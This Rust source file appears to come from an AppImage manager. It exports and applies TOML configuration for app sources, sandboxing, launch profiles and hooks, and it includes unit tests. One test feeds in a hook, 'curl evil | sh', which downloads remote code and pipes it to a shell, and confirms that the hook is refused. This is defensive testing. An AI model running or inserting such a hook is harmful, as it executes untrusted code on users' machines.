//! Declarative configuration: export everything you set up to a TOML file, and `apply` such a
//! file to a library (on this or another machine). Applying is idempotent: running it twice
//! changes nothing the second time.
//!
//! The file never contains absolute install paths, so it is portable.

use std::collections::BTreeMap;
use std::path::PathBuf;

use serde::{Deserialize, Serialize};

use crate::error::{Error, Result};
use crate::http::Http;
use crate::launch::{DEFAULT_PROFILE, Profile};
use crate::library::{AddOptions, Install, Library};
use crate::sandbox::{Bus, HomeAccess, Level, PathGrant, Settings};
use crate::source::{self, Channel, Origin, Policy, Provider};

pub const FORMAT_VERSION: u32 = 1;

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Config {
    pub version: u32,
    #[serde(default, rename = "app")]
    pub apps: Vec<AppConfig>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct AppConfig {
    /// The app's id in the library (derived from its name when adding).
    pub id: String,
    /// Informational only.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    /// A local AppImage to add when the app is missing (not written by `export`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file: Option<PathBuf>,
    /// Where updates come from: anything `appofholding source set` accepts.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source: Option<String>,
    /// `latest` (default), `latest-pre`, `latest-all` or a tag.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub channel: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub asset_pattern: Option<String>,
    /// auto | notify | manual | pinned
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub policy: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sandbox: Option<SandboxConfig>,
    #[serde(default, rename = "profile", skip_serializing_if = "Vec::is_empty")]
    pub profiles: Vec<ProfileConfig>,
    /// post-install / pre-update / post-update -> shell command
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub hooks: BTreeMap<String, String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SandboxConfig {
    /// none | standard | strict (individual fields below override the preset)
    pub level: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub network: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub gpu: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub audio: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub devices: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub display: Option<bool>,
    /// private | ro | rw
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub home: Option<String>,
    /// off | filtered | full
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub bus: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub chromium_workaround: Option<bool>,
    /// Folders to share; a `:rw` suffix makes one writable.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub allow: Vec<String>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProfileConfig {
    /// `default` or the name of an extra profile (shown in the app's right-click menu).
    pub name: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub args: Vec<String>,
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub env: BTreeMap<String, String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub prefix: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub presets: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cwd: Option<PathBuf>,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub extract_and_run: bool,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub elevated: bool,
}

impl Config {
    pub fn parse(text: &str) -> Result<Config> {
        let cfg: Config = toml::from_str(text)
            .map_err(|e| Error::Other(format!("invalid configuration: {e}")))?;
        if cfg.version != FORMAT_VERSION {
            return Err(Error::Other(format!(
                "configuration format version {} is not supported (this build reads version {FORMAT_VERSION})",
                cfg.version
            )));
        }
        let mut seen = std::collections::BTreeSet::new();
        for a in &cfg.apps {
            if a.id.trim().is_empty() {
                return Err(Error::Other("an [[app]] entry has no id".into()));
            }
            if !seen.insert(&a.id) {
                return Err(Error::Other(format!("app '{}' is listed twice", a.id)));
            }
        }
        Ok(cfg)
    }

    pub fn to_toml(&self) -> Result<String> {
        let body = toml::to_string_pretty(self).map_err(|e| Error::Other(e.to_string()))?;
        Ok(format!(
            "# appOFholding configuration. Apply it with: appofholding apply <this file>\n\
             # Missing apps with a `source` are downloaded; everything else is set up as written.\n\n{body}"
        ))
    }
}

/// The link form of a source, which `source::parse_input` turns back into the same provider.
pub fn source_to_input(p: &Provider) -> String {
    match p {
        Provider::GitHub { owner, repo } => format!("https://github.com/{owner}/{repo}"),
        // Self-hosted GitLab (invent.kde.org, ...) is only recognised with the prefix.
        Provider::GitLab { host, project }
            if host == "gitlab.com" || host.starts_with("gitlab.") =>
        {
            format!("https://{host}/{project}")
        }
        Provider::GitLab { host, project } => format!("gitlab:https://{host}/{project}"),
        Provider::Forgejo { host, owner, repo } => format!("forgejo:https://{host}/{owner}/{repo}"),
        Provider::Url { url } => url.clone(),
        Provider::Zsync { url } => format!("zsync|{url}"),
    }
}

fn sandbox_to_config(s: &Settings) -> Option<SandboxConfig> {
    if !s.enabled() {
        return None;
    }
    // Record the closest preset and only the fields that differ from it, so presets stay readable.
    let differences = |b: &Settings| {
        [
            s.network != b.network,
            s.gpu != b.gpu,
            s.audio != b.audio,
            s.devices != b.devices,
            s.display != b.display,
            s.home != b.home,
            s.bus != b.bus,
            s.chromium_workaround != b.chromium_workaround,
        ]
        .iter()
        .filter(|d| **d)
        .count()
    };
    let (standard, strict) = (
        Settings::for_level(Level::Standard),
        Settings::for_level(Level::Strict),
    );
    let (base_level, base) =
        if s.level == Level::Strict || differences(&strict) < differences(&standard) {
            (Level::Strict, strict)
        } else {
            (Level::Standard, standard)
        };
    let diff = |a: bool, b: bool| (a != b).then_some(a);
    Some(SandboxConfig {
        level: base_level.as_str().into(),
        network: diff(s.network, base.network),
        gpu: diff(s.gpu, base.gpu),
        audio: diff(s.audio, base.audio),
        devices: diff(s.devices, base.devices),
        display: diff(s.display, base.display),
        home: (s.home != base.home).then(|| s.home.as_str().into()),
        bus: (s.bus != base.bus).then(|| s.bus.as_str().into()),
        chromium_workaround: diff(s.chromium_workaround, base.chromium_workaround),
        allow: s
            .paths
            .iter()
            .map(|g| format!("{}{}", g.path.display(), if g.write { ":rw" } else { "" }))
            .collect(),
    })
}

fn sandbox_from_config(c: &SandboxConfig) -> Result<Settings> {
    let level = Level::parse(&c.level)
        .filter(|l| *l != Level::Custom)
        .ok_or_else(|| {
            Error::Other(format!(
                "sandbox level '{}' must be none, standard or strict",
                c.level
            ))
        })?;
    let mut s = Settings::for_level(level);
    if level == Level::None {
        return Ok(s);
    }
    if let Some(v) = c.network {
        s.network = v
    }
    if let Some(v) = c.gpu {
        s.gpu = v
    }
    if let Some(v) = c.audio {
        s.audio = v
    }
    if let Some(v) = c.devices {
        s.devices = v
    }
    if let Some(v) = c.display {
        s.display = v
    }
    if let Some(v) = c.chromium_workaround {
        s.chromium_workaround = v
    }
    if let Some(h) = &c.home {
        s.home = HomeAccess::parse(h)
            .ok_or_else(|| Error::Other(format!("sandbox home '{h}' must be private, ro or rw")))?;
    }
    if let Some(b) = &c.bus {
        s.bus = Bus::parse(b).ok_or_else(|| {
            Error::Other(format!("sandbox bus '{b}' must be off, filtered or full"))
        })?;
    }
    for a in &c.allow {
        let (p, write) = match a.rsplit_once(':') {
            Some((p, "rw")) => (p, true),
            Some((p, "ro")) => (p, false),
            _ => (a.as_str(), false),
        };
        s.paths.push(PathGrant {
            path: p.into(),
            write,
        });
    }
    Ok(s.normalized())
}

fn profile_to_config(name: &str, p: &Profile) -> ProfileConfig {
    ProfileConfig {
        name: name.into(),
        args: p.args.clone(),
        env: p.env.clone(),
        prefix: p.prefix.clone(),
        presets: p.presets.clone(),
        cwd: p.cwd.clone(),
        extract_and_run: p.extract_and_run,
        elevated: p.elevated,
    }
}

fn profile_from_config(c: &ProfileConfig) -> Profile {
    Profile {
        args: c.args.clone(),
        env: c.env.clone(),
        prefix: c.prefix.clone(),
        cwd: c.cwd.clone(),
        extract_and_run: c.extract_and_run,
        elevated: c.elevated,
        presets: c.presets.clone(),
    }
}

/// What `apply` did (or would do) for one app.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Note {
    Installed(String),
    Added(String),
    /// Not in the library and nothing says how to get it.
    Missing {
        id: String,
        reason: String,
    },
    Configured(String),
    Failed {
        id: String,
        error: String,
    },
}

#[derive(Debug, Clone, Default)]
pub struct ApplyOptions {
    /// Do not download missing apps.
    pub no_install: bool,
    /// Also delete extra profiles and hooks that the file does not list.
    pub prune: bool,
    /// Accept entries that make appOFholding run commands: hooks, command prefixes and
    /// profiles that start the app as root. Off by default, so a file from someone else cannot
    /// slip them in.
    pub allow_commands: bool,
}

/// What in this entry would run commands on this machine, in words (empty when nothing does).
pub fn commands_in(a: &AppConfig) -> Vec<String> {
    let mut out: Vec<String> = a
        .hooks
        .iter()
        .map(|(kind, cmd)| format!("{kind} hook: {cmd}"))
        .collect();
    for p in &a.profiles {
        if !p.prefix.is_empty() {
            out.push(format!(
                "profile '{}' runs under: {}",
                p.name,
                p.prefix.join(" ")
            ));
        }
        if p.elevated {
            out.push(format!("profile '{}' starts the app as root", p.name));
        }
    }
    out
}

impl Library {
    pub fn export_config(&self) -> Result<Config> {
        let mut cfg = Config {
            version: FORMAT_VERSION,
            apps: vec![],
        };
        for app in self.list()? {
            let mut a = AppConfig {
                id: app.id.clone(),
                name: Some(app.name.clone()),
                ..AppConfig::default()
            };
            if let Some(src) = self.source(&app.id)? {
                a.source = Some(source_to_input(&src.source.provider));
                if src.source.channel != Channel::Stable {
                    a.channel = Some(src.source.channel.to_string());
                }
                a.asset_pattern = src.source.asset_pattern.clone();
                if src.policy != Policy::Notify {
                    a.policy = Some(src.policy.as_str().into());
                }
            }
            a.sandbox = sandbox_to_config(&self.sandbox_settings(&app.id)?);
            a.profiles = self
                .profiles(&app.id)?
                .iter()
                .map(|(n, p)| profile_to_config(n, p))
                .collect();
            a.hooks = self.hooks(&app.id)?.into_iter().collect();
            cfg.apps.push(a);
        }
        Ok(cfg)
    }

    /// Make the library match `cfg`. Apps not mentioned are left alone. A failure for one app
    /// is reported and does not stop the others.
    pub fn apply_config(&self, http: &dyn Http, cfg: &Config, opts: &ApplyOptions) -> Vec<Note> {
        let mut notes = Vec::new();
        for a in &cfg.apps {
            match self.apply_app(http, a, opts) {
                Ok(mut n) => notes.append(&mut n),
                Err(e) => notes.push(Note::Failed {
                    id: a.id.clone(),
                    error: e.to_string(),
                }),
            }
        }
        notes
    }

    fn apply_app(&self, http: &dyn Http, a: &AppConfig, opts: &ApplyOptions) -> Result<Vec<Note>> {
        let mut notes = Vec::new();
        // Validate everything first, so a typo never leaves an app half-configured.
        let sandbox = a.sandbox.as_ref().map(sandbox_from_config).transpose()?;
        let policy = a
            .policy
            .as_deref()
            .map(|p| {
                Policy::parse(p).ok_or_else(|| {
                    Error::Other(format!(
                        "policy '{p}' must be auto, notify, manual or pinned"
                    ))
                })
            })
            .transpose()?;
        let source = match &a.source {
            Some(link) => {
                let mut s = source::parse_input(link)?.source;
                s.origin = Origin::User;
                if let Some(c) = &a.channel {
                    s.channel = Channel::parse(c);
                }
                if let Some(p) = &a.asset_pattern {
                    s.asset_pattern = Some(p.clone());
                }
                Some(s)
            }
            None => None,
        };
        for p in &a.profiles {
            if p.name != DEFAULT_PROFILE && !crate::launch::valid_profile_name(&p.name) {
                return Err(Error::Other(format!(
                    "'{}' is not a valid profile name",
                    p.name
                )));
            }
            profile_from_config(p).validate()?;
        }
        for kind in a.hooks.keys() {
            crate::profiles::check_kind(kind)?;
        }
        let commands = commands_in(a);
        if !commands.is_empty() && !opts.allow_commands {
            return Err(Error::Other(format!(
                "not applied: the file asks to run commands ({}). Read them, then re-run with --allow-commands if you trust them",
                commands.join("; ")
            )));
        }

        if self.get(&a.id).is_err() {
            let opts_add = AddOptions {
                install: Install::Copy,
                id: Some(a.id.clone()),
            };
            if let Some(file) = &a.file {
                self.add(file, &opts_add)?;
                notes.push(Note::Added(a.id.clone()));
            } else if let (Some(src), false) = (&source, opts.no_install) {
                let parsed = source::Parsed {
                    source: src.clone(),
                    asset_url: None,
                };
                self.install_from_source(http, parsed, &opts_add, &mut |_, _| {})?;
                notes.push(Note::Installed(a.id.clone()));
            } else {
                let reason = if opts.no_install && source.is_some() {
                    "not installed (downloads are turned off)".to_string()
                } else {
                    "not installed, and the entry has neither `source` nor `file`".to_string()
                };
                return Ok(vec![Note::Missing {
                    id: a.id.clone(),
                    reason,
                }]);
            }
        }

        if let Some(s) = &source {
            self.set_source(&a.id, s)?;
        }
        if let Some(p) = policy
            && self.source(&a.id)?.is_some()
        {
            self.set_policy(&a.id, p)?;
        }
        if let Some(s) = &sandbox {
            self.set_sandbox(&a.id, s)?;
        } else if a.sandbox.is_none() && opts.prune {
            self.set_sandbox(&a.id, &Settings::default())?;
        }
        let wanted: Vec<&str> = a.profiles.iter().map(|p| p.name.as_str()).collect();
        for p in &a.profiles {
            self.set_profile(&a.id, &p.name, &profile_from_config(p))?;
        }
        if opts.prune {
            for (name, _) in self.profiles(&a.id)? {
                if !wanted.contains(&name.as_str()) {
                    self.delete_profile(&a.id, &name)?;
                }
            }
        }
        for (kind, cmd) in &a.hooks {
            self.set_hook(&a.id, kind, cmd)?;
        }
        if opts.prune {
            for (kind, _) in self.hooks(&a.id)? {
                if !a.hooks.contains_key(&kind) {
                    self.clear_hook(&a.id, &kind)?;
                }
            }
        }
        notes.push(Note::Configured(a.id.clone()));
        Ok(notes)
    }
}

#[cfg(test)]
#[allow(clippy::field_reassign_with_default)]
mod tests {
    use super::*;
    use crate::fixture;
    use crate::http::fake::FakeHttp;
    use crate::paths::Dirs;
    use sha2::{Digest, Sha256};
    use std::fs;

    fn lib() -> (tempfile::TempDir, Library) {
        let tmp = tempfile::tempdir().unwrap();
        let lib =
            Library::open(Dirs::with_root(tmp.path()), tmp.path().join("appofholding")).unwrap();
        (tmp, lib)
    }

    fn set_up(tmp: &std::path::Path, lib: &Library) {
        let p = tmp.join("Foo.AppImage");
        fs::write(
            &p,
            fixture::simple_appimage(
                "Foo App",
                Some("gh-releases-zsync|o|foo|latest|Foo-*-x86_64.AppImage.zsync"),
            ),
        )
        .unwrap();
        lib.add(&p, &AddOptions::default()).unwrap();
        lib.set_policy("foo-app", Policy::Auto).unwrap();
        lib.set_sandbox(
            "foo-app",
            &Settings {
                network: false,
                paths: vec![PathGrant {
                    path: "/tmp".into(),
                    write: true,
                }],
                ..Settings::for_level(Level::Standard)
            },
        )
        .unwrap();
        let mut p = Profile::default();
        p.args = vec!["--flag".into(), "a b".into()];
        p.presets = vec!["x11".into()];
        p.env.insert("K".into(), "v".into());
        lib.set_profile("foo-app", "default", &p).unwrap();
        lib.set_profile(
            "foo-app",
            "debug",
            &Profile {
                presets: vec!["debug".into()],
                ..Profile::default()
            },
        )
        .unwrap();
        lib.set_hook("foo-app", "post-update", "echo done").unwrap();
    }

    #[test]
    fn commands_in_a_file_are_refused_unless_allowed() {
        let tmp = tempfile::tempdir().unwrap();
        let lib =
            Library::open(Dirs::with_root(tmp.path()), tmp.path().join("appofholding")).unwrap();
        let p = tmp.path().join("Foo.AppImage");
        std::fs::write(&p, fixture::simple_appimage("Foo App", None)).unwrap();
        lib.add(&p, &crate::library::AddOptions::default()).unwrap();
        let cfg = Config::parse(
            "version = 1\n[[app]]\nid = \"foo-app\"\n[app.hooks]\npost-update = \"curl evil | sh\"\n",
        )
        .unwrap();
        let notes = lib.apply_config(&FakeHttp::default(), &cfg, &ApplyOptions::default());
        assert!(
            matches!(&notes[..], [Note::Failed { error, .. }] if error.contains("--allow-commands") && error.contains("curl evil")),
            "{notes:?}"
        );
        assert!(
            lib.hooks("foo-app").unwrap().is_empty(),
            "nothing was written"
        );

        // A typo in a hook name is caught before anything is changed.
        let bad = Config::parse(
            "version = 1\n[[app]]\nid = \"foo-app\"\npolicy = \"manual\"\n[app.hooks]\npost-updat = \"true\"\n",
        )
        .unwrap();
        let opts = ApplyOptions {
            allow_commands: true,
            ..Default::default()
        };
        let notes = lib.apply_config(&FakeHttp::default(), &bad, &opts);
        assert!(matches!(&notes[..], [Note::Failed { .. }]), "{notes:?}");

        let notes = lib.apply_config(&FakeHttp::default(), &cfg, &opts);
        assert!(matches!(&notes[..], [Note::Configured(_)]), "{notes:?}");
        assert_eq!(lib.hooks("foo-app").unwrap().len(), 1);
    }

    #[test]
    fn every_kind_of_source_survives_export_and_apply() {
        let providers = [
            Provider::GitHub {
                owner: "o".into(),
                repo: "r".into(),
            },
            Provider::GitLab {
                host: "gitlab.com".into(),
                project: "g/p".into(),
            },
            Provider::GitLab {
                host: "invent.kde.org".into(),
                project: "g/p".into(),
            },
            Provider::Forgejo {
                host: "codeberg.org".into(),
                owner: "o".into(),
                repo: "r".into(),
            },
            Provider::Url {
                url: "https://www.vendor.com/dl?os=linux".into(),
            },
            Provider::Zsync {
                url: "https://x.org/Foo.AppImage.zsync".into(),
            },
        ];
        for p in providers {
            let back = crate::source::parse_input(&source_to_input(&p)).unwrap();
            assert_eq!(back.source.provider, p);
        }
    }

    #[test]
    fn export_is_portable_readable_and_round_trips_through_toml() {
        let (tmp, lib) = lib();
        set_up(tmp.path(), &lib);
        let cfg = lib.export_config().unwrap();
        let text = cfg.to_toml().unwrap();
        assert!(
            !text.contains(&tmp.path().display().to_string()),
            "no machine-specific paths: {text}"
        );
        assert!(
            text.contains("source = \"https://github.com/o/foo\"")
                && text.contains("policy = \"auto\""),
            "{text}"
        );
        // The sandbox is a preset plus only what differs from it.
        assert!(
            text.contains("level = \"standard\"")
                && text.contains("network = false")
                && !text.contains("gpu"),
            "{text}"
        );
        assert!(text.contains("allow = [\"/tmp:rw\"]"), "{text}");
        assert_eq!(Config::parse(&text).unwrap(), cfg);
    }

    #[test]
    fn apply_reproduces_an_exported_setup_on_a_fresh_library_and_is_idempotent() {
        let (tmp, lib) = lib();
        set_up(tmp.path(), &lib);
        let text = lib.export_config().unwrap().to_toml().unwrap();

        // A "new machine": the app is not there; the source says where to get it.
        let (_tmp2, fresh) = self::lib();
        let img = fixture::simple_appimage(
            "Foo App",
            Some("gh-releases-zsync|o|foo|latest|Foo-*-x86_64.AppImage.zsync"),
        );
        let sha = hex::encode(Sha256::digest(&img));
        let rel = format!(
            r#"{{"tag_name":"v1.2.3","prerelease":false,"draft":false,"assets":[{{"name":"Foo-1.2.3-x86_64.AppImage","browser_download_url":"https://dl/foo","size":{},"digest":"sha256:{sha}"}}]}}"#,
            img.len()
        );
        let http = FakeHttp::default()
            .json("https://api.github.com/repos/o/foo/releases/latest", &rel)
            .bytes("https://dl/foo", img);
        let cfg = Config::parse(&text).unwrap();
        let notes = fresh.apply_config(
            &http,
            &cfg,
            &ApplyOptions {
                allow_commands: true,
                ..Default::default()
            },
        );
        assert_eq!(
            notes,
            vec![
                Note::Installed("foo-app".into()),
                Note::Configured("foo-app".into())
            ]
        );

        // Everything came across.
        let again = fresh.export_config().unwrap();
        let strip = |mut c: Config| {
            for a in &mut c.apps {
                a.name = None;
            }
            c
        };
        assert_eq!(strip(again.clone()), strip(cfg.clone()));
        assert_eq!(
            fresh.sandbox_settings("foo-app").unwrap().level,
            Level::Custom
        );

        // Applying again changes nothing and downloads nothing.
        let before = http.requests.lock().unwrap().len();
        let notes = fresh.apply_config(
            &http,
            &cfg,
            &ApplyOptions {
                allow_commands: true,
                ..Default::default()
            },
        );
        assert_eq!(notes, vec![Note::Configured("foo-app".into())]);
        assert_eq!(http.requests.lock().unwrap().len(), before);
        assert_eq!(fresh.export_config().unwrap(), again);
    }

    #[test]
    fn missing_apps_without_a_way_to_get_them_are_reported_not_fatal() {
        let (_t, lib) = lib();
        let cfg = Config::parse(
            "version = 1\n[[app]]\nid = \"ghost\"\n[[app]]\nid = \"other\"\nsource = \"o/r\"\n",
        )
        .unwrap();
        let notes = lib.apply_config(
            &FakeHttp::default(),
            &cfg,
            &ApplyOptions {
                no_install: true,
                allow_commands: true,
                ..Default::default()
            },
        );
        assert!(
            matches!(&notes[0], Note::Missing { id, reason } if id == "ghost" && reason.contains("neither")),
            "{notes:?}"
        );
        assert!(
            matches!(&notes[1], Note::Missing { reason, .. } if reason.contains("downloads are turned off")),
            "{notes:?}"
        );
        // A download failure is a Failed note for that app only.
        let notes = lib.apply_config(
            &FakeHttp::default(),
            &cfg,
            &ApplyOptions {
                allow_commands: true,
                ..Default::default()
            },
        );
        assert!(
            matches!(&notes[1], Note::Failed { id, .. } if id == "other"),
            "{notes:?}"
        );
    }

    #[test]
    fn typos_and_bad_values_are_rejected_before_anything_changes() {
        let (tmp, lib) = lib();
        set_up(tmp.path(), &lib);
        assert!(
            Config::parse("version = 2\n")
                .unwrap_err()
                .to_string()
                .contains("not supported")
        );
        assert!(
            Config::parse("version = 1\n[[app]]\nid = \"a\"\npolcy = \"auto\"\n")
                .unwrap_err()
                .to_string()
                .contains("polcy")
        );
        assert!(
            Config::parse("version = 1\n[[app]]\nid = \"a\"\n[[app]]\nid = \"a\"\n")
                .unwrap_err()
                .to_string()
                .contains("twice")
        );

        let cfg = Config::parse(
            "version = 1\n[[app]]\nid = \"foo-app\"\npolicy = \"pinned\"\n[app.sandbox]\nlevel = \"paranoid\"\n",
        )
        .unwrap();
        let notes = lib.apply_config(
            &FakeHttp::default(),
            &cfg,
            &ApplyOptions {
                allow_commands: true,
                ..Default::default()
            },
        );
        assert!(
            matches!(&notes[0], Note::Failed { error, .. } if error.contains("paranoid")),
            "{notes:?}"
        );
        assert_eq!(
            lib.source("foo-app").unwrap().unwrap().policy,
            Policy::Auto,
            "the valid-looking policy was not applied either"
        );
    }

    #[test]
    fn prune_removes_what_the_file_does_not_list() {
        let (tmp, lib) = lib();
        set_up(tmp.path(), &lib);
        let cfg = Config::parse(
            "version = 1\n[[app]]\nid = \"foo-app\"\n[[app.profile]]\nname = \"default\"\n",
        )
        .unwrap();
        // Without --prune, extras stay.
        lib.apply_config(
            &FakeHttp::default(),
            &cfg,
            &ApplyOptions {
                allow_commands: true,
                ..Default::default()
            },
        );
        assert_eq!(lib.profiles("foo-app").unwrap().len(), 2);
        assert_eq!(lib.hooks("foo-app").unwrap().len(), 1);
        assert!(lib.sandbox_settings("foo-app").unwrap().enabled());
        lib.apply_config(
            &FakeHttp::default(),
            &cfg,
            &ApplyOptions {
                prune: true,
                allow_commands: true,
                ..Default::default()
            },
        );
        assert_eq!(lib.profiles("foo-app").unwrap().len(), 1);
        assert!(lib.hooks("foo-app").unwrap().is_empty());
        assert!(!lib.sandbox_settings("foo-app").unwrap().enabled());
    }

    #[test]
    fn local_files_can_be_added() {
        let (tmp, lib) = lib();
        let f = tmp.path().join("Bar.AppImage");
        fs::write(&f, fixture::simple_appimage("Bar", None)).unwrap();
        let text = format!(
            "version = 1\n[[app]]\nid = \"bar\"\nfile = \"{}\"\npolicy = \"manual\"\n",
            f.display()
        );
        let notes = lib.apply_config(
            &FakeHttp::default(),
            &Config::parse(&text).unwrap(),
            &ApplyOptions {
                allow_commands: true,
                ..Default::default()
            },
        );
        assert_eq!(notes[0], Note::Added("bar".into()));
        assert_eq!(lib.get("bar").unwrap().id, "bar");
    }
}
